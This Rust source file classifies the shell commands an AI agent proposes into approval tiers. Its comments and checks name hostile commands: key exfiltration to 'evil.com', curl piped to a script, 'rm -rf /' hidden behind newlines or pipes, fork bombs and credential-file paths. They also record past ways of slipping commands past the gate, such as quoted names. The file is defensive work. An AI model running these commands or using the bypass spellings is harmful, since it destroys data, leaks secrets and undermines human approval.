//! Tiered command policy: classify shell commands T0-T3, map tiers to
//! approval decisions. Pure function of (command, in_repo) — no IO, so the
//! red-team suite can pin every attack to a tier.

/// Safety tier of a shell command, from safest to most dangerous
/// (spec §6.4). Ordering is meaningful: a chained command takes the
/// highest tier among its segments, so `T3` always wins.
#[derive(
    Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, serde::Serialize, serde::Deserialize,
)]
pub enum Tier {
    /// Read-only: auto-approved.
    T0,
    /// Low-write: auto in repo, ask outside.
    T1,
    /// Risky: always ask, show exact command + diff.
    T2,
    /// Critical: ask + type-to-confirm. Never auto-passes.
    T3,
}

/// What the policy demands before a command may run. `Auto` runs
/// immediately, `Ask` shows the exact command and waits for consent,
/// `ConfirmType` requires the user to retype the command to prove intent
/// (spec §6.4).
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub enum Approval {
    /// Run without prompting: read-only, or a low-write action inside a repo.
    Auto,
    /// Prompt with the exact command and the diff before running.
    Ask,
    /// Prompt and require the command to be typed back verbatim.
    ConfirmType,
}

/// Map a tier to the approval it demands. `in_repo` relaxes T1 only:
/// a low-write command auto-runs inside a repo and asks outside it.
/// T0 is always auto; T3 always requires type-to-confirm and is never
/// auto-passed, whatever the context.
pub fn decide(tier: Tier, in_repo: bool) -> Approval {
    match tier {
        Tier::T0 => Approval::Auto,
        Tier::T1 if in_repo => Approval::Auto,
        Tier::T1 => Approval::Ask,
        Tier::T2 => Approval::Ask,
        Tier::T3 => Approval::ConfirmType,
    }
}

/// Interpreters and script runners whose arguments are code, not data:
/// `python3 -c '...'`, `perl -e`, `bash payload.sh`, `node -e`. The body
/// is arbitrary and unreadable at a glance, exactly like `sh -c`, so it
/// floors at T2. Version suffixes match (`python3.12`, `ruby3.3`).
fn runs_undisclosed_code(first: &str, core: &str) -> bool {
    let name: String = first
        .chars()
        .take_while(char::is_ascii_alphabetic)
        .collect();
    if !matches!(
        name.as_str(),
        // Shells: a script file is code too, not just `-c`.
        "sh" | "bash" | "dash" | "zsh" | "ksh" | "fish"
            // Interpreters.
            | "python" | "perl" | "ruby" | "node" | "php" | "lua" | "deno" | "bun"
            | "osascript" | "irb" | "wish" | "tclsh" | "expect"
    ) {
        return false;
    }
    let args: Vec<&str> = core.split_whitespace().skip(1).collect();
    // A bare interpreter opens a REPL: code without a command line.
    if args.is_empty() {
        return true;
    }
    // Inline-code flags (attached or not), program on stdin, or any plain
    // argument: a script path is undisclosed code with no flag to mark it.
    args.iter()
        .any(|a| !a.starts_with('-') || is_inline_code_flag(a))
}

/// Inline-code flags, in every spelling the wild uses: `-c`, and the
/// attached form `-c'payload'` that is one shell token. Attached short
/// flags are not exotic — they are how people write them by hand.
fn is_inline_code_flag(arg: &str) -> bool {
    matches!(arg, "-" | "--eval" | "--command")
        || arg.starts_with("-c")
        || arg.starts_with("-e")
        || arg.starts_with("-E")
        || arg.starts_with("--eval=")
        || arg.starts_with("--command=")
}

/// Key prefixes that identify a credential on sight. Matches the scrubber
/// in zet-blocks, so the two agree on what a secret looks like: a command
/// carrying one is T3 whether or not the token looks like a path.
const SECRET_KEY_PREFIXES: &[&str] = &[
    "github_pat_",
    "sk-or-",
    "sk-ant-",
    "sk-proj-",
    "xoxb-",
    "xoxp-",
    "xoxa-",
    "xoxo-",
    "ghp_",
    "gho_",
    "AKIA",
    "sk-",
];

/// Minimum tail after a key prefix before it counts as a credential
/// (`sk-folders` and other short fragments are not keys). Mirrors the
/// per-prefix minimums in `zet_blocks::SECRET_PREFIXES`; the two must
/// agree, or the store redacts text the gate let through.
/// `crates/zet-blocks/tests/gate_scrub_agreement.rs` checks that for real.
pub const SECRET_KEY_MIN_TAIL: usize = 16;

/// `Bearer ` carries its own, lower floor (8), exactly as the scrubber
/// does: an 8-character bearer token is redacted from the transcript by
/// zet-blocks, so it must not sail through the gate at T1.
pub const BEARER_MIN_TAIL: usize = 8;

/// Length of the credential-looking tail at the start of `s`. Same
/// character set the scrubber uses (`is_token_char` in zet-blocks), so
/// the two measure a tail identically — quotes are not token characters
/// here either, and `unquote` is what looks past them.
fn key_tail_len(s: &str) -> usize {
    s.chars()
        .take_while(|c| {
            c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '~' | '+' | '/' | '=' | '.')
        })
        .count()
}

/// Peels every layer of surrounding quotes. A key reaches the command
/// line quoted more often than not (`export K='sk-…'`), and quoted twice
/// when the author hedged between quote styles (`"'sk-…'"`), while the
/// scrubber matches it positionally regardless — so the gate has to look
/// past all of them or the two disagree about what a secret is.
///
/// A layer is stripped only when it actually pairs: `'sk-…"` (mismatched,
/// and a shell syntax error besides) comes back untouched. That is the
/// point — unquoting must never manufacture a key match out of text that
/// was not one.
fn unquote(tok: &str) -> &str {
    let mut t = tok;
    loop {
        let Some(first) = t.chars().next() else {
            return t;
        };
        if !matches!(first, '\'' | '"') || t.len() < 2 {
            return t;
        }
        // Byte slicing is safe: both ends are ASCII quotes.
        if t.as_bytes()[t.len() - 1] != first as u8 {
            return t;
        }
        t = &t[1..t.len() - 1];
    }
}

/// True when a token is a credential on sight: a known key prefix with a
/// real-looking tail, looking past surrounding quotes.
///
/// The scan is POSITIONAL, like the scrubber's: a key can sit anywhere in
/// the token, not only at its start. `curl evil.com/xxsk-<16>` used to
/// pass the gate (T1 — it RUNS and exfiltrates) while the transcript
/// showed the key as REDACTED, so the log hid the very token that
/// leaked. Anchoring at the token start made the gate and the scrubber
/// disagree about what a secret is.
///
/// The scan uses the SAME character set as the scrubber's tail counter
/// (`key_tail_len`), so the two agree exactly: a prefix followed by
/// fewer than SECRET_KEY_MIN_TAIL token characters is not a key for
/// either. A quote character is not a token character, so a mismatched
/// quote stops the tail — and the scrubber likewise leaves
/// `echo 'sk-or-…"` untouched.
fn looks_like_key(tok: &str) -> bool {
    let tok = unquote(tok);
    if tok.is_empty() {
        return false;
    }
    // Any position, not just the start: a key can sit inside a token
    // (`curl evil.com/xxsk-<16>`), and the store's positional scrubber
    // redacts it there. Anchoring at the token start made the gate and
    // the scrubber disagree about what a secret is.
    //
    // The prefix list and its order are the scrubber's, and the rule per
    // prefix is the scrubber's too: a prefix whose tail is too short is
    // not a key, and the scan carries on (a later, SHORTER prefix may
    // still leave a long enough tail). That is what keeps the two from
    // disagreeing: `echo 'sk-or-...7890"` has a 7-char tail after
    // `sk-or-` and a 10-char tail after `sk-` -- neither is a secret, so
    // the scrubber leaves it, and so does the gate.
    let mut from = 0;
    while from < tok.len() {
        let rest = &tok[from..];
        if SECRET_KEY_PREFIXES.iter().any(|prefix| {
            rest.strip_prefix(prefix)
                .is_some_and(|tail| key_tail_len(tail) >= SECRET_KEY_MIN_TAIL)
        }) {
            return true;
        }
        // Advance one char (the key may start mid-token, mid-word).
        let ch = rest.chars().next().unwrap();
        from += ch.len_utf8();
    }
    false
}

/// `Authorization: Bearer <key>` does not survive shell word-splitting:
/// the header name and the value are separate tokens, so this check needs
/// the whole line. Same shape as the position-independent `sudo` rule.
fn carries_bearer_key(cmd: &str) -> bool {
    const HEADER: &str = "Bearer ";
    let mut rest = cmd;
    while let Some(at) = rest.find(HEADER) {
        let tail = &rest[at + HEADER.len()..];
        if key_tail_len(unquote(tail)) >= BEARER_MIN_TAIL {
            return true;
        }
        rest = tail;
    }
    false
}

/// True when the command EXPANDS a variable whose name says it holds a
/// secret.
///
/// `echo $GITHUB_TOKEN` reads the token out of the environment. The
/// value never appears in the command line, so no key-prefix scan can
/// see it — but the expansion ships the value to the model, unasked.
///
/// The name pattern is narrow on purpose: TOKEN, KEY, SECRET, PASSWORD
/// and CREDENTIAL, in an UPPERCASE name (the convention for real
/// secrets). `$PATH`, `$key` and `$monkey` are ordinary variables and
/// must not start asking.
fn expands_secret_var(cmd: &str) -> bool {
    const MARKERS: &[&str] = &["TOKEN", "KEY", "SECRET", "PASSWORD", "CREDENTIAL"];
    let bytes = cmd.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        // `$` not escaped by a backslash.
        if bytes[i] != b'$' || (i > 0 && bytes[i - 1] == b'\\') {
            i += 1;
            continue;
        }
        let rest = &cmd[i + 1..];
        // `${NAME}` and `$NAME` both name a variable.
        let name: &str = if let Some(after) = rest.strip_prefix('{') {
            match after.find('}') {
                Some(end) => &after[..end],
                None => {
                    i += 1;
                    continue;
                }
            }
        } else {
            let end = rest
                .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
                .unwrap_or(rest.len());
            &rest[..end]
        };
        // The marker must be a WHOLE underscore-delimited word in the
        // name. A substring match made every ordinary uppercase
        // variable that happens to CONTAIN a marker a secret:
        // $MONKEY, $KEYBOARD, $SECRETARY, $KEY. A plain `echo` of those
        // became type-to-confirm, which is the gate asking about
        // nothing.
        // The marker must be a whole underscore-delimited word in the
        // name, AND the name must have a PREFIX: real secrets are
        // namespaced (GITHUB_TOKEN, AWS_SECRET_ACCESS_KEY, DB_PASSWORD).
        // A bare $KEY, $TOKEN or $SECRET is far too generic to gate on --
        // asking to confirm `echo $KEY` is the gate crying wolf.
        let is_secret_name = !name.is_empty()
            && name
                .chars()
                .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_')
            && {
                let words: Vec<&str> = name.split('_').filter(|w| !w.is_empty()).collect();
                words.len() > 1 && words.iter().any(|word| MARKERS.contains(word))
            };
        if is_secret_name {
            return true;
        }
        i += 1;
    }
    false
}

/// Path-like tokens that smell like secrets. Requires a `/`, `.`, or `~`
/// so commit messages like "secret fix" don't false-positive.
fn is_secret_token(tok: &str) -> bool {
    // Key prefixes identify themselves wherever they appear — checked on
    // the whole token and on the value half of `VAR=value`, which is how
    // a key actually reaches the shell (`export K=sk-or-v1-…`).
    let value = tok.split_once('=').map(|(_, v)| v).unwrap_or("");
    if looks_like_key(tok) || (!value.is_empty() && looks_like_key(value)) {
        return true;
    }
    let lower = tok.to_lowercase();
    let pathy = tok.contains('/') || tok.contains('.') || tok.contains('~');
    pathy
        && (lower.contains(".ssh")
            || lower.contains(".aws")
            || lower.contains("id_rsa")
            || lower.contains("id_ed25519")
            || lower.contains("credentials")
            || lower.contains(".gnupg")
            || lower.contains("secret")
            || lower.contains("token")
            || lower.contains(".pem")
            || lower.contains(".key"))
}

fn kubectl_tier(cmd: &str, lower: &str) -> Tier {
    if lower.contains("prod") {
        return Tier::T3;
    }
    let sub = cmd.split_whitespace().nth(1).unwrap_or("");
    match sub {
        "get" | "describe" | "logs" | "top" => Tier::T0,
        "apply" | "delete" | "scale" | "exec" | "cp" | "port-forward" | "drain" => Tier::T2,
        _ => Tier::T1,
    }
}

fn git_tier(cmd: &str) -> Tier {
    let sub = cmd.split_whitespace().nth(1).unwrap_or("");
    match sub {
        "status" | "diff" | "log" | "show" | "branch" | "rev-parse" => Tier::T0,
        "push" => Tier::T2,
        _ => Tier::T1,
    }
}

/// Strip leading `VAR=value` assignments so env prefixes can't shift the
/// real command out of first-token checks. Returns a subslice of `cmd`.
fn strip_env_assignments(cmd: &str) -> &str {
    let mut s = cmd.trim_start();
    loop {
        let tok = s.split_whitespace().next().unwrap_or("");
        if tok.is_empty() {
            break;
        }
        let valid = match tok.split_once('=') {
            Some((name, _)) => {
                !name.is_empty()
                    && !name.contains('/')
                    && !name.starts_with('-')
                    && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
                    && !name.starts_with(|c: char| c.is_ascii_digit())
            }
            None => false,
        };
        if !valid {
            break;
        }
        s = s[tok.len()..].trim_start();
    }
    s
}

/// First token, basenamed: `/usr/bin/su` and `./su` both yield `su`.
fn norm_first(core: &str) -> &str {
    let tok = core.split_whitespace().next().unwrap_or("");
    tok.rsplit('/').next().unwrap_or(tok)
}

/// The command word the shell would actually execute.
///
/// A shell strips quotes and backslash escapes BEFORE it looks a name
/// up, so `'rm'`, `"rm"`, `r'm'`, `r""m` and `s\udo` all RUN `rm` and
/// `sudo` — `command -v 'rm'` resolves to /usr/bin/rm. A gate that
/// compares the raw token misses every one of them, and a mass delete
/// or a privilege escalation then runs at auto-approve.
///
/// These spellings are not exotic: they are ordinary shell quoting.
/// The gate has to compare the word the shell would run.
fn exec_word(tok: &str) -> String {
    let mut out = String::with_capacity(tok.len());
    let mut chars = tok.chars().peekable();
    // Quote state. Inside SINGLE quotes a backslash is literal, so
    // `echo 'su\do'` is the literal text `su\do` -- the shell does not
    // run sudo, and the gate must not claim it does. Inside double
    // quotes a backslash still escapes.
    let mut in_single = false;
    let mut in_double = false;
    while let Some(c) = chars.next() {
        match c {
            // A backslash escapes the next character; the backslash goes.
            // A backslash before a NEWLINE is a line continuation: both
            // characters vanish, so `s\<NL>udo` is the word `sudo` and
            // the gate must see it as one.
            '\\' => match chars.peek() {
                Some('\n') => {
                    chars.next();
                }
                Some(next) => {
                    let next = *next;
                    chars.next();
                    if in_single {
                        // Literal backslash inside single quotes.
                        out.push('\\');
                    }
                    out.push(next);
                }
                None => {}
            },
            // Quote characters are removed, their contents kept.
            '\'' if !in_double => {
                in_single = !in_single;
            }
            '"' if !in_single => {
                in_double = !in_double;
            }
            other => out.push(other),
        }
    }
    out
}

/// Normalize every token of a command, keeping quote state ACROSS
/// tokens.
///
/// A quote can open in one token and close in another, so the state
/// cannot be reset per token: `git commit -m 'fix s\udo'` has the
/// backslash inside single quotes, where the shell keeps it literal,
/// but a per-token pass would treat it as an escape and see `sudo`.
/// The whole line is walked once, with the quote state carried across
/// the whitespace.
fn exec_words(cmd: &str) -> String {
    let mut out = String::with_capacity(cmd.len());
    let mut in_single = false;
    let mut in_double = false;
    let mut token = String::new();
    let mut chars = cmd.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '\'' if !in_double => {
                in_single = !in_single;
                token.push(c);
            }
            '"' if !in_single => {
                in_double = !in_double;
                token.push(c);
            }
            // A backslash-newline is a line CONTINUATION: both vanish, so
            // `s\<NL>udo` is the single word `sudo`. The newline must
            // not end the token, and the backslash is dropped later by
            // exec_word.
            '\\' => {
                token.push(c);
                if chars.peek() == Some(&'\n') {
                    chars.next();
                    token.push('\n');
                }
            }
            // Whitespace inside quotes is part of the word, not a
            // separator. A newline AFTER a backslash was already
            // consumed above.
            c if c.is_whitespace() && !in_single && !in_double => {
                if !token.is_empty() {
                    out.push_str(&exec_word(&token));
                    out.push(' ');
                    token.clear();
                }
            }
            other => token.push(other),
        }
    }
    if !token.is_empty() {
        out.push_str(&exec_word(&token));
    }
    out
}

/// The command NAME the shell would execute: quoting removed, then the
/// path stripped. `/usr/bin/rm`, `'rm'` and `r"m"` all yield `rm`.
fn exec_name(tok: &str) -> String {
    let word = exec_word(tok);
    word.rsplit('/').next().unwrap_or("").to_string()
}

/// The first token of a command, as the shell would execute it.
///
/// Used wherever the gate compares a command name. Path stripping alone
/// (`norm_first`) is not enough: a quoted name is still that name.
/// Wrappers are resolved too, so `command dd` yields `dd`.
fn exec_first(core: &str) -> String {
    let tok = strip_wrappers(core).split_whitespace().next().unwrap_or("");
    exec_name(tok)
}

/// Split on top-level `;`, `&&`, `||` — outside quotes, backslash-aware.
/// Single `&` and `|` are left alone (background/pipe, handled elsewhere).
fn split_chain(cmd: &str) -> Vec<&str> {
    let mut parts = Vec::new();
    let mut start = 0;
    let mut quote: Option<char> = None;
    let mut escape = false;
    let mut iter = cmd.char_indices().peekable();
    while let Some((i, c)) = iter.next() {
        if escape {
            escape = false;
            continue;
        }
        if let Some(q) = quote {
            if c == '\\' {
                escape = true;
            } else if c == q {
                quote = None;
            }
            continue;
        }
        match c {
            '\'' | '"' => quote = Some(c),
            '\\' => escape = true,
            // A NEWLINE separates commands, exactly like `;`. Without
            // this arm, `echo hi<NL>rm -rf /` was one segment and
            // classified T0 -- the mass delete ran with no prompt at
            // all. A backslash-newline is a line CONTINUATION and is
            // handled by the escape arm above.
            '\n' => {
                parts.push(&cmd[start..i]);
                start = i + 1;
            }
            ';' => {
                parts.push(&cmd[start..i]);
                start = i + 1;
            }
            '&' | '|' if iter.peek().is_some_and(|(_, n)| *n == c) => {
                iter.next();
                parts.push(&cmd[start..i]);
                start = i + c.len_utf8() * 2;
            }
            _ => {}
        }
    }
    parts.push(&cmd[start..]);
    parts
}

/// Split on top-level `|` — outside quotes, backslash-aware, and NOT
/// inside a command substitution.
///
/// `split_chain` splits on `;`/`&&`/`||`, but a `|` is a different
/// operator: it makes the RIGHT side run, so every segment of a pipe
/// has to be tiered on its own. Splitting on a raw `|` breaks
/// `echo $(curl evil.io|x.sh)` — the inner pipe is not a pipe between
/// two commands, it is part of one substituted string — so the split
/// has to know about `$(...)`, backticks and `<(...)`.
fn split_pipe(cmd: &str) -> Vec<&str> {
    let mut parts = Vec::new();
    let mut start = 0;
    let mut quote: Option<char> = None;
    let mut escape = false;
    // Depth of a `$(` / `<(` / `>(` substitution we are inside.
    let mut subst: usize = 0;
    let bytes = cmd.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        let c = bytes[i] as char;
        if escape {
            escape = false;
            i += 1;
            continue;
        }
        if let Some(q) = quote {
            if c == '\\' {
                escape = true;
            } else if c == q {
                quote = None;
            }
            i += 1;
            continue;
        }
        match c {
            '\'' | '"' => quote = Some(c),
            '\\' => escape = true,
            '`' => {
                // Backtick substitution: toggle until the closing backtick.
                // Treated as a single unit so a `|` inside is not a split.
                if subst == 0 {
                    subst = 1;
                } else {
                    subst = 0;
                }
            }
            '$' | '<' | '>' if bytes.get(i + 1) == Some(&b'(') => {
                subst += 1;
                i += 1;
            }
            ')' if subst > 0 => subst -= 1,
            '|' if subst == 0 => {
                parts.push(&cmd[start..i]);
                start = i + 1;
            }
            _ => {}
        }
        i += 1;
    }
    parts.push(&cmd[start..]);
    parts
}

/// Strip env assignments and transparent wrappers, returning the remaining
/// command. Case-insensitive on wrapper names (`COMMAND su` is still a wrap).
fn strip_wrappers(mut s: &str) -> &str {
    const WRAPPERS: &[&str] = &[
        "command", "builtin", "exec", "time", "nohup", "nice", "setsid", "timeout",
    ];
    loop {
        s = strip_env_assignments(s);
        let tok = s.split_whitespace().next().unwrap_or("");
        // Compare the name the shell would execute: `'command'` and
        // `c\ommand` are still the command builtin, so a quoted wrapper
        // must not hide the real command behind it.
        if !WRAPPERS
            .iter()
            .any(|w| exec_name(tok).eq_ignore_ascii_case(w))
        {
            return s;
        }
        s = skip_flag_args(s[tok.len()..].trim_start());
    }
}

/// Transparent wrappers resolved past (`timeout 10`, `nice -n 5`).
/// Returns the first REAL token.
fn resolve_first(core: &str) -> &str {
    norm_first(strip_wrappers(core))
}

/// Pipe-segment command with dispatcher layers resolved to fixpoint
/// (`| xargs busybox su` sees `su`, `| xargs grep` sees `grep`).
/// Terminates: each layer consumes at least one token.
fn seg_first(seg: &str) -> &str {
    let mut s = seg;
    loop {
        let f = resolve_first(s);
        if !matches!(f, "xargs" | "busybox") {
            return f;
        }
        let stripped = strip_wrappers(s);
        let tok = stripped.split_whitespace().next().unwrap_or("");
        let rest = skip_flag_args(stripped[tok.len()..].trim_start());
        if rest.trim().is_empty() {
            return f;
        }
        s = rest;
    }
}

/// Flags that consume the following token as their value (`-I REPL`,
/// `--signal KILL`). Case-SENSITIVE, matched against original-case tokens:
/// bare `-i` is boolean (only attached `-iREPL` consumes), while `-I`
/// always takes a separate value. (`-p` prompt must not match `-P`.)
const VALUE_FLAGS: &[&str] = &[
    "-s",
    "--signal",
    "-n",
    "--adjustment",
    "--max-args",
    "-L",
    "-l",
    "--max-lines",
    "-P",
    "--max-procs",
    "--max-chars",
    "-I",
    "--replace",
    "-d",
    "--delimiter",
    "-a",
    "--arg-file",
    "-E",
    "--eof",
];

/// Skip flag (`-x`), value-flag pairs (`-I REPL`), and bare-number (`10`)
/// argument tokens.
fn skip_flag_args(s: &str) -> &str {
    skip_flag_args_with(s, &[])
}

/// Flag/arg skipper with tool-scoped extra value flags. Scoped on
/// purpose: bare `-t` is valueless for xargs (trace) but takes a pid
/// for nsenter — sharing one list would mis-skip one of them.
fn skip_flag_args_with<'a>(mut s: &'a str, extra_values: &[&str]) -> &'a str {
    let mut value_next = false;
    loop {
        let a = s.split_whitespace().next().unwrap_or("");
        if a.is_empty() {
            break;
        }
        if value_next {
            // Previous token was a value-taking flag: this is its value.
            value_next = false;
        } else if VALUE_FLAGS.contains(&a) || extra_values.contains(&a) {
            value_next = true;
        } else if !(a.starts_with('-') || a.chars().all(|c| c.is_ascii_digit())) {
            break;
        }
        s = s[a.len()..].trim_start();
    }
    s
}

fn is_mass_target(t: &str) -> bool {
    let t = t.trim_matches('\'').trim_matches('"');
    matches!(
        t,
        "/" | "/*" | "~" | "~/*" | "~/" | "." | "./" | "*" | "$HOME" | "$HOME/*" | "$HOME/"
    )
}

/// Classify a shell command into its safety tier (spec §6.4).
///
/// Pure and IO-free: the tier depends only on the command text. Chains
/// (`;`, `&&`, `||`) take the worst tier of their segments, and the
/// command is analyzed past env assignments and transparent wrappers
/// (`VAR=1 timeout 10 su …` is seen as `su`). Classification fails
/// closed: anything unrecognized is T1 (ask), and privilege escalation,
/// mass deletion, secret access, and `prod` contexts are T3.
pub fn classify(cmd: &str) -> Tier {
    // Chains take the worst tier. Recursion terminates: segments hold no
    // top-level separators by construction.
    let segments = split_chain(cmd);
    if segments.len() > 1 {
        return segments
            .iter()
            .filter(|s| !s.trim().is_empty())
            .map(|s| classify(s))
            .max()
            .unwrap_or(Tier::T1);
    }
    // Analyze the command past env prefixes and transparent wrappers:
    // `VAR=1 timeout 10 su ...` must see `su`. Name matching is on
    // ORIGINAL case: the shell itself is case-sensitive, so `SU` or `RM`
    // are not the tools (`lower` survives only for safe over-match
    // substrings like sudo/prod, where extra hits merely over-ask).
    let core = strip_env_assignments(cmd);
    let lower = core.to_lowercase();
    // Basenamed, wrapper-resolved first token, original case.
    let first = resolve_first(core);
    // The same token as the shell would EXECUTE it: quoting and
    // backslash escapes removed. `'rm'` is still `rm`; comparing the raw
    // token let a quoted command name slip past every name check.
    let first_exec = exec_first(core);
    let first_exec = first_exec.as_str();
    // Dispatchers: the real command follows (xargs may interleave flags).
    // Recursion terminates: the remainder is strictly shorter.
    if matches!(first_exec, "busybox" | "xargs") {
        let resolved = strip_wrappers(core);
        let tok = resolved.split_whitespace().next().unwrap_or("");
        let rest = skip_flag_args(resolved[tok.len()..].trim_start());
        if rest.trim().is_empty() {
            return Tier::T0;
        }
        return classify(rest);
    }
    // Altered roots/namespaces: resolve the inner command past flags and
    // the root/pid target, floor at T2 (crossing the boundary always asks,
    // but `su` inside stays critical). Fails closed: unparseable shapes
    // and bare entry (interactive jail shell) stay T2.
    if matches!(first_exec, "chroot" | "nsenter") {
        let extra = if first == "chroot" {
            &["--userspec", "--groups"][..]
        } else {
            &[
                "-t", "--target", "-r", "--root", "-w", "--wd", "-S", "--setuid", "-G", "--setgid",
            ][..]
        };
        let stripped = strip_wrappers(core);
        let tok = stripped.split_whitespace().next().unwrap_or("");
        let mut rest = skip_flag_args_with(stripped[tok.len()..].trim_start(), extra);
        if first == "chroot" {
            let root = rest.split_whitespace().next().unwrap_or("");
            rest = rest[root.len()..].trim_start();
        }
        if rest.is_empty() {
            return Tier::T2;
        }
        return classify(rest).max(Tier::T2);
    }

    // --- T3: critical. Checked first; nothing below may downgrade these. ---
    // Privilege escalation: sudo/doas/pkexec anywhere, su/gosu as a real
    // (normalized) first token. Over-classifying here is the safe direction.
    //
    // The name compared is the one the shell would EXECUTE: a quoted or
    // backslash-escaped spelling (`s\udo`, `su""do`) still runs sudo, and
    // a plain substring scan misses it. `exec_word` strips quoting and
    // escapes over the whole command, so an escaped name anywhere is
    // caught, while `lower.contains` is kept for the bare spellings.
    // The normalization is applied PER TOKEN, not to the whole command:
    // a quote opened in one token does not close in the next, and
    // running the whole line through one pass would let an unterminated
    // quote swallow the rest of the command.
    let exec_lower = exec_words(core).to_lowercase();
    if exec_lower.contains("sudo")
        || exec_lower.contains("doas")
        || exec_lower.contains("pkexec")
        || matches!(first_exec, "su" | "gosu" | "runas")
    {
        return Tier::T3;
    }
    if exec_lower.contains(":(){") || exec_lower.contains("mkfs") {
        return Tier::T3;
    }
    // `dd` is a disk wipe when it writes a device. The check is on the
    // RESOLVED first token, not a raw prefix: `command dd …`,
    // `nice dd …`, `timeout 10 dd …` and `/usr/bin/dd …` all run dd, and
    // a prefix test let them through at auto-approve.
    if first_exec == "dd" {
        return Tier::T3;
    }
    // Recursive rm in any flag spelling: -r, -R, bundles (-rfv), long form.
    // The gate uses the resolved first token, so `command rm` is caught.
    let resolved = strip_wrappers(core);
    let toks: Vec<&str> = resolved.split_whitespace().collect();
    if first_exec == "rm" {
        // Flags are read from the NORMALIZED token, not the raw one: a
        // backslash-escaped flag (`rm \-rf /`) is the same `-rf` to the
        // shell, but the raw token starts with `\` and never matched the
        // recursive test — so a mass delete ran at auto-approve.
        let toks: Vec<String> = toks.iter().map(|t| exec_word(t)).collect();
        let recursive = toks.iter().skip(1).any(|t| {
            t == "--recursive"
                || (t.starts_with('-')
                    && !t.starts_with("--")
                    && t[1..].chars().any(|c| c == 'r' || c == 'R'))
        });
        if recursive {
            let targets: Vec<&String> = toks
                .iter()
                .skip(1)
                .filter(|t| !t.starts_with('-'))
                .collect();
            if targets.iter().any(|t| is_mass_target(t)) || targets.is_empty() {
                return Tier::T3;
            }
            return Tier::T2;
        }
        return Tier::T1;
    }
    if cmd.split_whitespace().any(is_secret_token) || carries_bearer_key(cmd) {
        return Tier::T3;
    }
    // Expanding a secret variable is a secret access. `echo $GITHUB_TOKEN`
    // was T0 — the value went to the model with no prompt at all, and the
    // variable name says plainly what it holds. The name pattern is
    // deliberately narrow (TOKEN/KEY/SECRET/PASSWORD/CREDENTIAL), and
    // only uppercase names count, so `$PATH`, `$key` and `$monkey` are
    // untouched.
    if expands_secret_var(cmd) {
        return Tier::T3;
    }
    if first_exec == "env" || first_exec == "printenv" {
        return Tier::T3;
    }
    if first_exec == "kubectl" {
        return kubectl_tier(core, &lower);
    }

    // --- T2: risky. ---
    // Pipe into privilege escalation is T3: the escalation sink, not a shell.
    // Segments resolve on original case (see `first` above).
    let piped_privesc = split_pipe(core).iter().skip(1).any(|seg| {
        matches!(
            seg_first(seg),
            "sudo" | "doas" | "su" | "gosu" | "runas" | "pkexec"
        )
    });
    if piped_privesc {
        return Tier::T3;
    }
    // Pipe-to-shell in any spacing: split on '|' and inspect each segment's
    // (normalized) command, so `|sh`, `|  sh`, `|/bin/sh` all match while
    // `|show` does not.
    let piped_shell = split_pipe(core)
        .iter()
        .skip(1)
        .any(|seg| matches!(seg_first(seg), "sh" | "bash" | "dash" | "zsh" | "fish"));
    if piped_shell {
        return Tier::T2;
    }
    // Every OTHER pipe segment is tiered too, and the WORST tier wins.
    // Only the head used to be judged, so `echo x | xargs rm -rf /` fell
    // to T0 — a mass delete behind a pipe, with no prompt at all. A pipe
    // does not launder the command at its tail: the tail still runs.
    // Termination: each segment holds no top-level `|`, so classify on
    // a segment cannot recurse into another pipe.
    //
    // The maximum is taken over ALL segments, not the first non-T0 one.
    // Returning early on a T1 segment let a later critical tail slip
    // through: `echo x | tee out | rm -rf /` returned T1 because `tee`
    // came first, and the mass delete ran at auto-approve.
    let mut pipe_tier = Tier::T0;
    for seg in split_pipe(core).iter().skip(1) {
        let seg = seg.trim();
        if seg.is_empty() {
            continue;
        }
        let t = classify(seg);
        if t > pipe_tier {
            pipe_tier = t;
        }
    }
    if pipe_tier > Tier::T0 {
        return pipe_tier;
    }
    if first_exec == "find" {
        let args: Vec<&str> = core.split_whitespace().skip(1).collect();
        if args.contains(&"-delete") {
            // "." is cwd-scoped (like `rm -R ./target`): risky, not critical.
            let mass_path = args
                .iter()
                .filter(|a| !a.starts_with('-') && !["{}", "+", ";"].contains(a))
                .any(|p| is_mass_target(p) && *p != "." && *p != "./");
            if mass_path {
                return Tier::T3;
            }
            return Tier::T2;
        }
        if args
            .iter()
            .any(|a| matches!(*a, "-exec" | "-execdir" | "-ok" | "-okdir"))
        {
            return Tier::T2;
        }
    }
    // Hidden commands: substitution, process substitution both directions,
    // eval, and `sh -c '...'` all run text the user can't see at a glance.
    if lower.contains("$(")
        || lower.contains('`')
        || lower.contains("<(")
        || lower.contains(">(")
        || first_exec == "eval"
        || (matches!(first_exec, "sh" | "bash" | "dash" | "zsh" | "fish")
            && core
                .split_whitespace()
                .skip(1)
                .any(|a| a == "-c" || a.starts_with("-c")))
    {
        return Tier::T2;
    }
    // Interpreters and script runners: everything after the binary is
    // code the gate cannot read. Found by the red-team suite, which
    // showed `python3 -c 'shutil.rmtree("/")'` falling to T1 — which
    // AUTO-APPROVES inside a repo, i.e. an unprompted mass delete. T2 is
    // the same floor `sh -c` and `find -exec` already get.
    if runs_undisclosed_code(first_exec, core) {
        return Tier::T2;
    }
    if first_exec == "docker" {
        let sub = core.split_whitespace().nth(1).unwrap_or("").to_lowercase();
        return match sub.as_str() {
            "ps" | "images" | "ls" => Tier::T0,
            _ => Tier::T2,
        };
    }
    if first_exec == "git" {
        let t = git_tier(core);
        if t == Tier::T2 {
            return Tier::T2;
        }
    }

    // --- T1: writes and unknowns. ---
    // Redirection writes a file (ignoring 2> stderr noise).
    let no_stderr = lower.replace("2>", "\u{0}");
    if no_stderr.contains('>') {
        return Tier::T1;
    }
    if first == "git" {
        return git_tier(core);
    }
    if matches!(
        first_exec,
        "npm" | "cargo" | "pip" | "mkdir" | "touch" | "cp" | "mv" | "sed" | "tee" | "curl" | "wget"
    ) {
        return Tier::T1;
    }
    // Note: `rm` is handled above (recursive spellings); plain rm returns T1 there.

    // --- T0: known reads. ---
    if matches!(
        first_exec,
        "ls" | "cat"
            | "head"
            | "tail"
            | "less"
            | "more"
            | "echo"
            | "pwd"
            | "ps"
            | "which"
